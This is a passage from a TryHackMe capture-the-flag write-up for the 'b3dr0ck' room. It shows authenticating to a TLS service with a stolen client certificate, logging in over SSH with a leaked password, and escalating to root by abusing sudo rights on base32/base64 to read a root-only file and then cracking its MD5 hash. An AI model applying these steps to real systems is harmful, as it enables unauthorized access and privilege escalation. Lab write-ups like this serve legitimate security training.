MIICmDCCAYACAjA5MA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yMzA4MDMwOTQ0MzdaFw0yMzA4MDQwOTQ0MzdaMA8xDTALBgNVBAMMBEZy
ZWQwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDRdpyJUjsI0mnHfni0
bvGAmRB6a3Ga9iFFu1lOflHRol2ZkB9qPmiwu9vFTw/4q+WUuxcdmRS1EPnUyEqW
LFvqC9QdW4r3poKmzT1wTbVLCQaIe4xu8LlOJ8uQZ3a87h17r9+1IAOBwyEDOQZ+
rS0xXh9cC3cJUqJAAtv+8zhCUoXmhF1MqJY3cxpQvUbg0k9LAd7a3lBwL7dFx5cV
TuELEsY4FBC+Z9fWcVUaIT5njpZaV65GEXzzXr5vXfTJfQaqNi4dolBCgiQZbOUV
q1g2vuVkPLZRIRWq71XqQajEGaSzycmCRu3pSKKxq5eEMvFtqnohqSEDC03Gdov8
+5GJAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAD68VHHQHwk3nKPSctdnR2JVh4Sj
gyoxyfm7q7daAJ6hDY377dqIDo5KaDM76uTZto39qIdLsMak/QDQW4yCjCExOZnG
94gn1AZbNUtP5Jon7rc1q94Oa2bg1OlG2L8WA9jdeCnQhdG5wEUQOojxO4MiOJ8Z
/rO6gawjBCNhBvQKhUzAt9IRQJNWbumcQiZM+JuYX13C+dvLg0BqTO21KHIosRqg
blCDDOXcYO4W654JAPUnASfllTWpmLFDF4Mz1dzvBWEzTjs/bM7JKX0dHEqK2BVc
51/rqigXlNXzILDAsH+woxPnFg+rnxPDbpiuJnee6OBhtVeL1/YGeU8HWqQ=
-----END CERTIFICATE-----
barney@b3dr0ck:~$
```

```bash
$ openssl s_client -connect 10.10.188.66:54321 -cert ./fredcert -key ./fredkey
CONNECTED(00000003)
Can't use SSL_get_servername
depth=0 CN = localhost
verify error:num=18:self-signed certificate
verify return:1
depth=0 CN = localhost
verify return:1
---
Certificate chain
 0 s:CN = localhost
   i:CN = localhost
   a:PKEY: rsaEncryption, 2048 (bit); sigalg: RSA-SHA256
...
...
...
read R BLOCK
Welcome: 'Fred' is authorized.
b3dr0ck> password
Password hint: YabbaDabbaD0000! (user = 'Fred')
b3dr0ck>
```

```bash
joshua@kaligra:~/Documents/thm/b3dr0ck$ ssh fred@10.10.188.66
fred@10.10.188.66's password:
fred@b3dr0ck:~$ ls
fred.txt
fred@b3dr0ck:~$ cat fred.txt
THM{08da34e619da839b154521da7323XXXX}
fred@b3dr0ck:~$
```

## privilege escalation

```bash
fred@b3dr0ck:~$ sudo -l
Matching Defaults entries for fred on b3dr0ck:
    insults, env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User fred may run the following commands on b3dr0ck:
    (ALL : ALL) NOPASSWD: /usr/bin/base32 /root/pass.txt
    (ALL : ALL) NOPASSWD: /usr/bin/base64 /root/pass.txt
fred@b3dr0ck:~$
```

```bash
fred@b3dr0ck:~$ sudo  /usr/bin/base32 /root/pass.txt | base32 -d
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
fred@b3dr0ck:~$ sudo /usr/bin/base64 /root/pass.txt | base64 -d
LFKEC52ZKRCXSWKXIZVU43KJGNMXURJSLFWVS52OPJAXUTLNJJVU2RCWNBGXURTLJZKFSSYK
```

Let's use https://gchq.github.io/

![](Pasted%20image%2020230803120230.png)

We found `a00a12aad6b7c16bf07032bd05a31d56` which is an MD5 hash.

Then, we use crackstation.net:

![](Pasted%20image%2020230803120337.png)


### root flag

```bash
fred@b3dr0ck:~$ su -
Password:
root@b3dr0ck:~# ls
pass.txt  root.txt  snap
root@b3dr0ck:~# cat root.txt
THM{de4043c009214b56279982bf10XXXXX}
root@b3dr0ck:~#

```

